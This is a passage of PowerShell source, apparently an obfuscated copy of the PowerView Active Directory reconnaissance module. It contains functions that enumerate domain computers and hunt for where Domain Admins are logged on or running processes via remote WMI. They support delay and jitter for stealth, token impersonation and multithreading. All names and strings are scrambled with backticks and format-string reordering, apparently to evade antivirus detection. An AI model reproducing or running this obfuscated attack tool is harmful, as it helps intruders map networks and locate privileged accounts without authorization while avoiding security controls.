            ForEach (${T`ArgE`TCOm`Put`ER} in ${TAr`GE`T`cOMpUTers}) {
                ${Co`U`NteR} = ${C`o`UnteR} + 1

                
                &("{2}{0}{1}" -f 'tar','t-Sleep','S') -Seconds ${R`ANDNo}.("{0}{1}"-f'N','ext').Invoke((1-${ji`TT`eR})*${DE`LAY}, (1+${Ji`T`Ter})*${d`E`LaY})

                &("{2}{0}{1}" -f 'rite-Ver','bose','W') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                &("{2}{0}{1}"-f 'v','oke-Command','In') -ScriptBlock ${ho`S`T`eNuMbLOcK} -ArgumentList ${t`Ar`getcOm`putEr}, ${Targ`eTU`seRS}, ${Cu`R`RE`NTuSer}, ${st`eAL`TH}, ${LOGonT`oK`EN}

                if (${rEs`ULt} -and ${S`Topon`SU`CC`ESs}) {
                    &("{2}{4}{1}{3}{0}" -f 'ose','-Ve','Wr','rb','ite') ("{15}{5}{12}{7}{8}{9}{4}{10}{17}{11}{2}{13}{1}{14}{6}{0}{3}{16}"-f ' ','turni','ser found,','e','L','d','g','om','ai','nUser','o','t u','-D',' re','n','[Fin','arly','cation] Targe')
                    return
                }
            }
        }
        else {
            &("{0}{3}{2}{1}" -f 'Wr','ose','erb','ite-V') ('['+'Find-D'+'om'+'ainU'+'serL'+'o'+'catio'+'n'+'] '+'U'+'sing '+'th'+'reading'+' '+'w'+'ith '+'thre'+'ads'+': '+"$Threads")
            &("{2}{1}{0}" -f'e-Verbose','rit','W') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            
            ${S`Cr`ipt`paRa`MS} = @{
                ("{2}{0}{1}" -f'U','sers','Target') = ${TARGE`T`USErs}
                ("{0}{1}{3}{2}"-f 'Curr','en','er','tUs') = ${c`Ur`R`ENtuseR}
                ("{0}{1}"-f'Ste','alth') = ${StEA`l`TH}
                ("{2}{1}{3}{0}"-f 'le','oken','T','Hand') = ${l`OGONtO`kEN}
            }

            
            &("{2}{0}{5}{1}{4}{3}"-f 'w-T','ad','Ne','on','edFuncti','hre') -ComputerName ${TArGEt`c`om`pUTe`RS} -ScriptBlock ${hoSt`EnUMbL`oCk} -ScriptParameters ${SCri`p`Tp`AR`AmS} -Threads ${t`HREA`Ds}
        }
    }

    END {
        if (${lO`g`OntokEN}) {
            &("{0}{1}{3}{2}"-f'Invoke-','Reve','lf','rtToSe') -TokenHandle ${L`O`g`oNTokEN}
        }
    }
}


function FiN`d-`d`omAIn`proceSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}" -f 'Shou','ldProc','ess','PS'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}" -f 'e','ntialTyp','PS','UsePSCrede'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{9}{0}{4}{7}{6}{2}{8}{3}{1}{5}"-f'v','xtForPasswor','singP','inTe','o','d','dU','i','la','PSA'}, '')]
    [OutputType({"{3}{4}{1}{2}{0}"-f 'Process','e','rView.User','P','ow'})]
    [CmdletBinding(DeFAuLtpArAmETERseTNAme = {"{1}{0}" -f 'e','Non'})]
    Param(
        [Parameter(POSiTIoN = 0, vAluEFrOmpiPELINE = ${t`RuE}, vaLuEfRompIPElInEbypropertyname = ${t`RUE})]
        [Alias({"{0}{1}{2}"-f 'D','NS','HostName'})]
        [String[]]
        ${cOMPUTerN`A`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOma`In},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`oMpU`T`eRDomAiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`OMPu`TerLD`APFiLTeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Co`MPuT`E`RSE`ARCHbasE},

        [Alias({"{2}{1}{0}{3}" -f'i','tra','Uncons','ned'})]
        [Switch]
        ${COmp`Ute`RUNco`NSt`RAi`N`ed},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{4}{0}{1}" -f 'ys','tem','Op','eratin','gS'})]
        [String]
        ${C`OMpU`T`eroperaTIngsyst`EM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}"-f'rvic','Se','ePac','k'})]
        [String]
        ${coMp`UTerS`E`R`V`iC`ePaCK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'S','iteN','ame'})]
        [String]
        ${C`omP`UTErSit`E`NaME},

        [Parameter(paraMETeRsetNaMe = "tar`G`eT`pROCE`ss")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`ocEsSNA`Me},

        [Parameter(PARAMetERSEtNAme = "Tar`gETuS`eR")]
        [Parameter(ParaMETERSeTnamE = "U`sERideNTi`Ty")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${u`Se`RIdE`NtitY},

        [Parameter(paRamEtErSeTnaMe = "t`AR`GETUs`ER")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${U`sERd`OMaiN},

        [Parameter(pARamETerseTnAmE = "TArGET`US`eR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`sERlDa`p`Fi`ltEr},

        [Parameter(parAMETERSetnAMe = "t`Ar`GETUSER")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${USE`RseA`RCHBA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'upNam','Gro','e'}, {"{1}{0}"-f 'oup','Gr'})]
        [String[]]
        ${uS`erg`ROUPiDE`NTitY} = ("{2}{1}{0}{3}" -f' Admi','n','Domai','ns'),

        [Parameter(PaRAMetERsETNAme = "tArg`e`TuSEr")]
        [Alias({"{2}{0}{1}" -f'inCoun','t','Adm'})]
        [Switch]
        ${usER`Ad`MiN`count},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{2}{1}{0}{5}"-f'e','ll','ontro','nC','Domai','r'})]
        [String]
        ${Ser`V`ER},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{1}{2}" -f'O','neLev','el'}, {"{1}{2}{0}"-f'ee','S','ubtr'})]
        [String]
        ${SEarcH`sCo`PE} = ("{2}{1}{0}"-f'e','e','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsuL`TPa`G`eSI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErv`ER`T`ime`limit},

        [Switch]
        ${tOmbs`T`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEdE`Nt`IAl} =   ${jh`3`Xo6}::"eM`PTy",

        [Switch]
        ${s`ToPON`sU`ccE`ss},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`eLay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${ji`Tt`Er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${t`HrEads} = 20
    )

    BEGIN {
        ${Co`M`PutERSeARC`h`e`RARGUm`ENts} = @{
            ("{2}{0}{1}" -f'rope','rties','P') = ("{3}{1}{0}{2}" -f 'sho','n','stname','d')
        }
        if (${psBoun`DPara`Met`eRS}[("{0}{1}" -f'Doma','in')]) { ${co`mP`Ut`E`R`SEarCH`erARGu`MENts}[("{0}{1}"-f 'Doma','in')] = ${DoMA`In} }
        if (${pS`B`oUn`dPa`R`AmEtErS}[("{3}{2}{4}{1}{0}"-f 'Domain','er','m','Co','put')]) { ${C`Om`p`UTersEARc`hE`RarGUmEntS}[("{1}{0}" -f 'omain','D')] = ${C`oMpu`TErdO`m`AIN} }
        if (${psb`oU`NDpara`meTeRs}[("{0}{2}{3}{1}" -f 'C','lter','omputerLDA','PFi')]) { ${COMp`UTeRSe`A`RChErARgUme`Nts}[("{2}{0}{1}"-f 'APFil','ter','LD')] = ${C`OMPU`TErl`dAPFIltER} }
        if (${Ps`BOuNDpAR`AMEtE`Rs}[("{3}{0}{1}{2}"-f 'Search','Ba','se','Computer')]) { ${co`mPuTers`EAr`cheraRGU`meNTS}[("{2}{1}{0}" -f'e','chBas','Sear')] = ${COmPu`TERsE`ARCHb`Ase} }
        if (${psBo`U`NDpaRame`TERs}[("{2}{4}{0}{3}{1}"-f 'cons','ained','U','tr','n')]) { ${Com`puTeRSE`AR`c`HERarGUMEn`Ts}[("{0}{1}{3}{2}" -f 'Unconst','ra','ned','i')] = ${un`co`NStrAined} }
        if (${PSB`o`Un`DpA`RAmeteRs}[("{0}{3}{1}{2}" -f'Comput','y','stem','erOperatingS')]) { ${c`OmpuTERs`eaR`cH`E`RaRgu`M`EnTS}[("{1}{3}{0}{2}"-f's','Operating','tem','Sy')] = ${o`pEr`ATiN`gSys`TeM} }
        if (${PsBo`UNDPaRa`Me`Ters}[("{3}{1}{4}{0}{2}{5}"-f 'vi','mputerSe','ce','Co','r','Pack')]) { ${compUt`E`Rs`eA`RChErArgU`m`ENTs}[("{2}{1}{0}" -f 'icePack','erv','S')] = ${SeRVIC`e`pA`ck} }
        if (${PSbO`UnDPaRa`m`ETeRS}[("{0}{2}{3}{1}"-f'Compu','teName','t','erSi')]) { ${c`om`Put`e`R`SEAr`cHERAR`gumEnTS}[("{2}{1}{0}"-f'eName','it','S')] = ${SiT`Ena`Me} }
        if (${p`Sbo`UNdp`AR`AMEteRS}[("{0}{2}{1}"-f'Ser','er','v')]) { ${c`omPuteRsEaRCh`eraR`Gu`MEnTS}[("{1}{0}"-f'er','Serv')] = ${seR`Ver} }
        if (${P`S`BoU`NdpAraMe`T`erS}[("{2}{1}{0}" -f'cope','S','Search')]) { ${C`OmPUTeRs`eA`R`ChERargUm`E`Nts}[("{0}{3}{1}{2}" -f'Searc','co','pe','hS')] = ${s`earC`Hs`coPE} }
        if (${P`SB`oundpaRA`meTErs}[("{3}{1}{0}{4}{2}" -f 'ultPage','es','ize','R','S')]) { ${compU`TERSEaR`C`herAR`GUmen`Ts}[("{2}{1}{0}{3}" -f 'tPag','sul','Re','eSize')] = ${Resul`T`p`AgESiZe} }
        if (${PSb`o`UndPar`AMEtERs}[("{0}{2}{1}"-f 'ServerTim','mit','eLi')]) { ${COM`p`UTe`RSearcHeraRgUmE`NTS}[("{0}{4}{3}{2}{1}"-f 'Se','it','meLim','i','rverT')] = ${s`eRVERTi`m`eliM`It} }
        if (${PsBOu`ND`pARA`M`etE`RS}[("{2}{1}{0}"-f 'ne','o','Tombst')]) { ${Comp`UterSEaR`c`H`e`RaRGUMENTs}[("{1}{0}{2}" -f 'ombston','T','e')] = ${t`om`BsTOnE} }
        if (${p`sbounDPARame`Te`RS}[("{1}{2}{0}"-f'tial','Cre','den')]) { ${coM`p`U`TeR`S`EArChErARgUmEN`Ts}[("{1}{3}{2}{0}"-f 'ntial','Cr','e','ed')] = ${crE`DEnT`IAL} }

        ${uSE`RsEar`CH`Er`ArGumenTs} = @{
            ("{1}{2}{0}" -f 's','Propert','ie') = ("{0}{1}{2}{4}{3}"-f's','amacco','un','e','tnam')
        }
        if (${psbouN`d`Pa`RAMe`TErS}[("{0}{1}{2}{3}"-f'UserIde','n','t','ity')]) { ${USEr`SE`Ar`cHEr`A`RgUMEnts}[("{0}{1}{2}"-f'Ide','n','tity')] = ${U`S`EriD`eNTI`TY} }
        if (${Ps`Bou`NDP`ARaME`Ters}[("{1}{0}"-f'omain','D')]) { ${uSe`RS`ear`CH`Er`ArgUME`Nts}[("{0}{1}" -f 'Domai','n')] = ${dOma`IN} }
        if (${P`SBO`Und`pARAMETe`Rs}[("{1}{2}{0}" -f 'rDomain','Us','e')]) { ${useRsEA`RcH`ER`ArG`UmenTs}[("{0}{1}"-f 'Doma','in')] = ${U`SeRdo`m`Ain} }
        if (${PSbouNdP`A`RaMeT`ERs}[("{3}{0}{2}{1}" -f 'serLDAP','er','Filt','U')]) { ${UseRseArch`er`AR`GUmEn`TS}[("{2}{3}{1}{0}" -f 'ilter','F','LDA','P')] = ${usE`R`lDaPfiLT`eR} }
        if (${Psbo`U`NDPar`AMeTERS}[("{1}{0}{2}"-f'rc','UserSea','hBase')]) { ${uSE`RsearC`HeR`A`R`guMe`Nts}[("{1}{0}{2}"-f 'h','Searc','Base')] = ${uSE`RsEaRC`H`B`AsE} }
        if (${P`Sbo`UnD`PAramETErS}[("{0}{1}{2}{4}{3}" -f 'U','se','r','Count','Admin')]) { ${u`SERSEa`RcHEr`A`RG`UmenTs}[("{0}{1}{2}"-f 'Admin','Cou','nt')] = ${uSER`A`DmINcOUnT} }
        if (${psb`O`UNdPaR`AMETeRS}[("{0}{1}" -f'Ser','ver')]) { ${us`eRsE`Ar`cherARGUm`eNTs}[("{0}{1}{2}"-f 'Serv','e','r')] = ${SE`Rver} }
        if (${p`s`B`OundParameT`erS}[("{2}{0}{1}"-f'hSco','pe','Searc')]) { ${u`sERSeARC`h`e`RA`RGu`meNTs}[("{1}{0}{3}{2}" -f 'archS','Se','pe','co')] = ${S`Ea`RcHs`cOPe} }
        if (${PsbOUN`D`PaR`AM`ETE`Rs}[("{2}{1}{3}{0}" -f 'ageSize','s','Re','ultP')]) { ${USErsE`A`RCHerar`g`UmeNTS}[("{1}{0}{2}" -f 'a','ResultP','geSize')] = ${Res`UL`TPag`E`SIZE} }
        if (${psbo`UndP`AR`A`MetERS}[("{2}{1}{3}{0}"-f 'it','erverTi','S','meLim')]) { ${Us`ER`sE`ArCheRArG`UMents}[("{1}{0}{3}{2}"-f 'r','Serve','mit','TimeLi')] = ${SERV`E`RtiME`l`iM`it} }
        if (${PSboUnDp`Ar`AmE`T`E`RS}[("{2}{1}{0}" -f 'bstone','m','To')]) { ${uSerSEA`RC`hEr`ARGuM`E`N`TS}[("{0}{1}" -f'Tombsto','ne')] = ${tO`mb`STone} }
        if (${Ps`BOundP`ARaM`etErS}[("{0}{2}{1}{3}"-f'Cre','ti','den','al')]) { ${USe`RS`EA`R`cHeRA`Rgume`NtS}[("{3}{2}{1}{0}"-f'al','nti','e','Cred')] = ${c`Re`d`ENTiaL} }


        
        if (${p`sBOUnD`pA`Ra`METERS}[("{3}{1}{0}{2}" -f 'r','mpute','Name','Co')]) {
            ${T`ARG`etcOmP`UT`ErS} = ${co`m`PUTe`R`NAme}
        }
        else {
            &("{0}{2}{1}{3}"-f 'W','bo','rite-Ver','se') ("{8}{13}{5}{11}{7}{10}{2}{0}{6}{1}{9}{12}{4}{3}"-f's','t','er','in','a','rocess] Q',' in ','ying com','[Fi','he do','put','uer','m','nd-DomainP')
            ${taR`GetC`OmputE`Rs} = &("{4}{2}{3}{0}{1}"-f'omp','uter','t-Doma','inC','Ge') @ComputerSearcherArguments | &("{3}{0}{1}{2}"-f 'l','ect','-Object','Se') -ExpandProperty ("{1}{2}{0}" -f'ostname','dn','sh')
        }
        &("{1}{2}{0}"-f 'e','Writ','e-Verbos') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if (${tA`RgeT`Co`mpu`TERs}."Le`Ngth" -eq 0) {
            throw ("{1}{11}{6}{3}{0}{12}{5}{2}{9}{7}{10}{8}{4}" -f 's] No h','[F',' ','roces','te','s','-DomainP','nd','a','fou',' to enumer','ind','ost')
        }

        
        if (${p`SbOuNDpAR`AMe`TE`RS}[("{3}{1}{2}{0}" -f'sName','ce','s','Pro')]) {
            ${taRgET`Pro`C`eSSNA`mE} = @()
            ForEach (${T} in ${pr`Oc`ESSNaME}) {
                ${tARGe`TPROc`Es`Sn`Ame} += ${T}.("{0}{1}" -f 'Spli','t').Invoke(',')
            }
            if (${tar`g`E`TP`R`oCEssnAME} -isnot [System.Array]) {
                ${tarGeTPrOce`S`sNa`mE} = [String[]] @(${tARgEtpROCE`s`SN`AME})
            }
        }
        elseif (${ps`BoUNdPar`Ame`T`E`RS}[("{0}{1}{2}" -f'UserI','dentit','y')] -or ${p`SbOUn`dP`ARAM`e`TErS}[("{0}{3}{1}{4}{2}"-f'UserL','PF','r','DA','ilte')] -or ${P`s`BOUnDParameT`e`Rs}[("{2}{4}{3}{1}{0}"-f'e','rchBas','Us','ea','erS')] -or ${p`SB`oundP`AraMEteRs}[("{0}{2}{1}"-f 'User','t','AdminCoun')] -or ${PsBO`U`NDPaRam`E`TeRS}[("{0}{3}{1}{4}{2}"-f 'UserA','Del','ation','llow','eg')]) {
            ${TARgE`T`Us`ERS} = &("{2}{0}{1}"-f'n','User','Get-Domai') @UserSearcherArguments | &("{0}{3}{1}{2}"-f'Select','e','ct','-Obj') -ExpandProperty ("{1}{0}{2}{3}" -f'coun','samac','tn','ame')
        }
        else {
            ${g`RoUPse`ARCheRAR`g`UmEnTS} = @{
                ("{2}{0}{1}" -f 'de','ntity','I') = ${uSE`R`GrOU`P`iDen`Tity}
                ("{0}{1}" -f'R','ecurse') = ${T`RUe}
            }
            if (${p`SB`Ound`PArAmeteRS}[("{0}{1}{2}" -f 'User','D','omain')]) { ${g`R`OupSea`RCh`eRar`GuME`N`TS}[("{1}{0}{2}"-f'ai','Dom','n')] = ${usERdO`Ma`in} }
            if (${P`SbOUN`dpAR`AMe`T`Ers}[("{0}{2}{1}"-f'UserSea','hBase','rc')]) { ${groU`P`SEaRCH`ERaRg`Ume`NTS}[("{0}{1}{2}" -f 'S','earc','hBase')] = ${u`se`R`sEARC`HBase} }
            if (${p`s`B`OUNDPArAmETE`Rs}[("{0}{1}"-f 'Se','rver')]) { ${Gro`U`P`S`e`Arch`eraRguMENTs}[("{0}{1}"-f 'Se','rver')] = ${Se`RVeR} }
            if (${pSB`oUND`pa`RAMeteRS}[("{0}{3}{1}{2}"-f 'Se','hSc','ope','arc')]) { ${GRouPS`Ea`RchER`ArgU`m`eN`TS}[("{2}{1}{3}{0}" -f'pe','e','S','archSco')] = ${SeaRCH`SC`O`pE} }
            if (${Psbo`UNDpaRa`Met`Ers}[("{0}{1}{3}{2}" -f'Res','ult','Size','Page')]) { ${GRo`U`PSEARcHerarGu`M`eNTS}[("{2}{4}{3}{1}{0}"-f'ze','i','R','PageS','esult')] = ${reSultp`Age`SI`Ze} }
            if (${psbOu`NDPaRAME`T`ERs}[("{2}{1}{3}{0}"-f 't','rTimeLi','Serve','mi')]) { ${gRo`UpSEaRC`h`Er`ARGUMEN`TS}[("{0}{2}{4}{3}{1}"-f'Se','t','rverTimeLi','i','m')] = ${ser`V`E`RTIm`ELImiT} }
            if (${pSbO`U`ND`paRamETE`Rs}[("{0}{2}{1}" -f 'T','tone','ombs')]) { ${GROu`psea`RchERa`Rgu`MEntS}[("{2}{3}{0}{1}" -f'n','e','To','mbsto')] = ${to`MbS`TonE} }
            if (${PsBOUN`D`PaRA`MEters}[("{3}{2}{1}{0}" -f'l','a','enti','Cred')]) { ${G`RoUPsEAr`CHeR`ArGU`M`e`N`TS}[("{2}{0}{1}"-f'r','edential','C')] = ${cREDe`N`T`IaL} }
            ${GrOU`p`seA`Rch`e`Rargu`mE`NTs}
            ${TAR`G`EtuseRs} = &("{2}{5}{0}{4}{1}{6}{3}"-f'in','ou','Get-D','Member','Gr','oma','p') @GroupSearcherArguments | &("{2}{1}{3}{0}" -f'ct','elect-Ob','S','je') -ExpandProperty ("{3}{2}{0}{1}"-f 'rN','ame','mbe','Me')
        }

        
        ${h`os`Te`NUmblo`CK} = {
            Param(${C`ompuTE`RNa`Me}, ${ProC`ESSNA`ME}, ${T`ARgE`T`USERs}, ${crE`d`eNT`iaL})

            ForEach (${TAr`geTc`om`PuTER} in ${COmPUte`R`NAMe}) {
                ${U`P} = &("{4}{3}{2}{0}{1}"-f'i','on','t','-Connec','Test') -Count 1 -Quiet -ComputerName ${TARge`Tc`oM`PUtEr}
                if (${Up}) {
                    
                    
                    if (${Cr`E`DEn`Tial}) {
                        ${pRo`C`ESseS} = &("{3}{2}{1}{0}{4}" -f 'Pro','I','-WM','Get','cess') -Credential ${cRe`D`ent`IaL} -ComputerName ${TaRgETC`om`PUt`Er} -ErrorAction ("{1}{3}{0}{2}"-f'tin','Sile','ue','ntlyCon')
                    }
                    else {
                        ${ProceS`s`Es} = &("{1}{0}{2}{3}" -f 't-WMIPr','Ge','oce','ss') -ComputerName ${TaRG`ETC`ompU`TeR} -ErrorAction ("{3}{1}{2}{4}{0}"-f 'tinue','ilent','lyCo','S','n')
                    }
                    ForEach (${P`RO`cEsS} in ${P`ROCes`seS}) {
                        
                        if (${pR`oCE`S`sNAMe}) {
                            if (${ProCe`sS`NAME} -Contains ${p`R`oCess}."P`ROce`Ssn`AME") {
                                ${p`RoCE`ss}
                            }
                        }
                        
                        elseif (${tA`RgE`TuserS} -Contains ${PRo`CesS}."u`SEr") {
                            ${pr`Oce`SS}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${ps`B`ouND`Par`AmeTE`RS}[("{1}{0}"-f 'ay','Del')] -or ${P`Sbo`UNdpARAM`eters}[("{4}{3}{0}{2}{1}" -f'opOnSuc','s','ces','t','S')]) {

            &("{3}{0}{1}{2}" -f'rite-','Ver','bose','W') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            &("{1}{0}{2}{3}" -f'te-Ve','Wri','r','bose') ('[Fi'+'n'+'d-Domai'+'nProc'+'e'+'ss]'+' '+'D'+'elay'+': '+"$Delay, "+'Jit'+'t'+'er: '+"$Jitter")
            ${CoU`N`TEr} = 0
            ${R`AN`dNo} = &("{0}{2}{1}"-f 'N','bject','ew-O') ("{2}{3}{1}{0}" -f'em.Random','st','S','y')

            ForEach (${TAr`gETcom`pU`TER} in ${T`A`R`geTComputE`Rs}) {
                ${couN`T`ER} = ${cou`Nt`er} + 1

                
                &("{1}{0}{2}{3}" -f'r','Sta','t-Sl','eep') -Seconds ${RA`NDNO}.("{1}{0}" -f 't','Nex').Invoke((1-${J`Itt`er})*${d`e`lAy}, (1+${Jitt`ER})*${DeL`Ay})

                &("{2}{1}{0}"-f 'e','bos','Write-Ver') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${Res`U`lT} = &("{0}{3}{1}{2}{4}" -f'In','o','ke-Com','v','mand') -ScriptBlock ${HoST`ENum`Bl`oCk} -ArgumentList ${tArGEtComP`U`Ter}, ${t`Ar`getprOc`es`s`NaMe}, ${targetUs`E`Rs}, ${CR`ED`eNTI`AL}
                ${R`Es`ULt}

                if (${ReSU`Lt} -and ${s`T`opON`SucC`EsS}) {
                    &("{1}{2}{3}{0}"-f 'se','Wri','te-V','erbo') ("{10}{0}{11}{6}{7}{1}{12}{4}{9}{3}{8}{2}{5}"-f 'ind','t','earl',' returnin','o','y','ar','ge','g ','und,','[F','-DomainProcess] T',' user f')
                    return
                }
            }
        }
        else {
            &("{0}{2}{1}"-f'Wr','e','ite-Verbos') ('[Find-Dom'+'ain'+'Proc'+'ess'+'] '+'U'+'sing'+' '+'thre'+'ad'+'ing '+'with'+' '+'thre'+'ads'+':'+' '+"$Threads")

            
            ${SCri`pTPA`RaMs} = @{
                ("{0}{2}{1}"-f'ProcessN','e','am') = ${TA`RgeTp`ROCESs`N`Ame}
                ("{1}{2}{0}"-f 's','TargetU','ser') = ${T`ArgeT`Use`Rs}
                ("{1}{0}{2}" -f 'd','Cre','ential') = ${cR`eDe`NtIAl}
            }

            
            &("{1}{3}{2}{0}{5}{4}"-f 'dedFunc','New','ea','-Thr','on','ti') -ComputerName ${t`A`RG`EtcoMPUt`erS} -ScriptBlock ${HO`ST`Enu`MbloCK} -ScriptParameters ${ScriptpA`R`AmS} -Threads ${thr`eA`Ds}
        }
    }
}


function FI`ND-d`om`AINU`s`eReVEnT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}"-f'uldProce','ss','PS','Sho'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{4}{6}{3}{5}{0}"-f'nAssignments','Us','PS','T','eDeclaredVarsMo','ha','re'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}{4}" -f'ent','red','ialT','PSUsePSC','ype'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{8}{0}{4}{5}{1}{3}{2}{6}" -f'gP','x','wo','tForPass','l','ainTe','rd','PSAvoi','dUsin'}, '')]
    [OutputType({"{4}{3}{1}{2}{0}"-f 't','.Logon','Even','ew','PowerVi'})]
    [OutputType({"{4}{3}{7}{9}{6}{0}{5}{2}{8}{1}" -f 'ti','n','lL','erView.Ex','Pow','a','n','plicit','ogo','Crede'})]
    [CmdletBinding(DEfAUlTParAmeterSetnaMe = {"{1}{0}" -f 'ain','Dom'})]
    Param(
        [Parameter(pARameTeRseTnaMe = "c`o`MpuTErN`AMe", posITIOn = 0, VaLuEfrOMpIpElIne = ${t`Rue}, vaLUefROMpIPeLINeByproperTYNAmE = ${t`RUE})]
        [Alias({"{2}{1}{0}"-f 'me','a','dnshostn'}, {"{2}{0}{1}" -f 'tN','ame','Hos'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cO`mPuT`ERNAME},

        [Parameter(PaRAMETerseTnaME = "dOM`Ain")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`A`in},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${f`iL`TER},

        [Parameter(VALUeFRompiPElINEByPRoPErtynAmE = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${STarT`T`IME} =   ${y0Q}::"N`Ow".("{0}{1}" -f'A','ddDays').Invoke(-1),

        [Parameter(VaLuefrOmPipELINEBYPROPERtyName = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${E`NdT`ImE} =  ( &("{1}{0}{2}" -f 'VARiAB','Get-','Le') ("y0"+"Q") -Val )::"N`Ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${ma`Xe`VenTs} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${U`SER`I`Den`TITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${UsEr`DOM`Ain},

        [ValidateNotNullOrEmpty()]
        [String]
        ${UseRl`DAp`FIL`T`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${us`Er`sea`RchbASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'roupN','ame','G'}, {"{1}{0}"-f 'up','Gro'})]
        [String[]]
        ${U`s`ErGRO`U`piDEnTITY} = ("{0}{3}{2}{1}"-f 'Domai','dmins','A','n '),

        [Alias({"{0}{2}{1}"-f'Ad','Count','min'})]
        [Switch]
        ${U`Ser`Ad`mINcOU`Nt},

        [Switch]
        ${C`hecKaCc`EsS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}"-f 'e','r','ntroll','DomainCo'})]
        [String]
        ${S`eRvER},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{1}{0}{2}"-f 'eL','On','evel'}, {"{0}{1}" -f 'S','ubtree'})]
        [String]
        ${SEAr`CHsCo`Pe} = ("{0}{1}" -f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eS`UlTpage`siZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVE`R`TImELImIt},

        [Switch]
        ${To`m`BsT`ONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEdeN`Ti`AL} =   (&("{2}{0}{1}"-f'b','le','VaRIA') ('jH3'+'xo6')  -vAlue)::"emP`TY",

        [Switch]
        ${STOpon`sU`C`CESS},

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`L`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jITT`eR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${thRE`ADS} = 20
    )

    BEGIN {
        ${uSE`R`SEaRcHERaRGUME`N`TS} = @{
            ("{1}{0}{2}"-f'opert','Pr','ies') = ("{4}{0}{2}{3}{1}"-f'ma','tname','c','coun','sa')
        }
        if (${PSB`Ou`NDPArame`TeRs}[("{3}{1}{2}{0}" -f'ty','d','enti','UserI')]) { ${uSersEA`R`CheRaRG`U`mE`NTS}[("{2}{1}{0}"-f'y','ntit','Ide')] = ${useR`ID`e`NtiTY} }
        if (${PSBoUnD`PARa`ME`TerS}[("{0}{2}{1}"-f 'User','omain','D')]) { ${users`EA`RcH`ERA`RGuM`e`Nts}[("{1}{0}" -f'main','Do')] = ${UsE`RDO`Ma`in} }
        if (${P`s`B`OUNdp`A`RamETeRs}[("{4}{2}{1}{0}{3}"-f 'ilte','rLDAPF','e','r','Us')]) { ${UsERS`eaRcH`er`Ar`guME`Nts}[("{0}{1}{2}" -f'LD','AP','Filter')] = ${U`serLD`APfiLTEr} }
        if (${pSbo`UNd`P`ARamEteRs}[("{1}{2}{4}{3}{0}" -f 'Base','Us','erS','rch','ea')]) { ${uSeRSEar`c`HE`R`ARgU`meNTS}[("{0}{2}{3}{1}" -f'Se','se','archB','a')] = ${useR`s`e`ARCHbAse} }
        if (${pSB`OuNd`P`AR`AMe`TeRs}[("{2}{3}{0}{1}"-f'Cou','nt','U','serAdmin')]) { ${Us`eRSE`ARC`H`erArgUments}[("{1}{2}{0}" -f'Count','A','dmin')] = ${uS`ER`AdmINc`OunT} }
        if (${pSB`OU`N`DPara`meTerS}[("{1}{2}{0}"-f 'r','Se','rve')]) { ${us`erseARchera`Rgume`N`TS}[("{1}{0}{2}" -f 'e','Serv','r')] = ${SE`RV`eR} }
        if (${p`sbOuNdP`AraM`eTerS}[("{0}{1}{2}" -f'Sea','rc','hScope')]) { ${u`seR`SE`ArcHerARGumEn`Ts}[("{0}{1}{2}" -f 'SearchSco','p','e')] = ${S`eArC`h`scOpe} }
